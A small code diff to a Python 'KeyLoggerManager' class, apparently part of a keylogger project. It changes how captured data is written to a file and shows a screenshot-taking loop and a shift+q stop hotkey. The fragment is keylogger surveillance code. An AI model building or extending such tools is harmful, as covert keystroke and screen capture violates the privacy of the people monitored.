@@ -19,7 +19,8 @@ class KeyLoggerManager:
         self.__instance._start()
 
     def write_file(self):
-        FileWriter.write_to_file(self.__instance.data)
+        writer = FileWriter()
+        writer.write_to_file(self.__instance.data)
 
     def __thread_take_shot(self):
         while self.__instance._KeyloggerService__action:
@@ -39,6 +40,7 @@ class KeyLoggerManager:
         while self.__instance._KeyloggerService__action:
             self.stop()
             time.sleep(0.1)
+
 
     def stop(self):
         if keyboard.is_pressed('shift+q'):
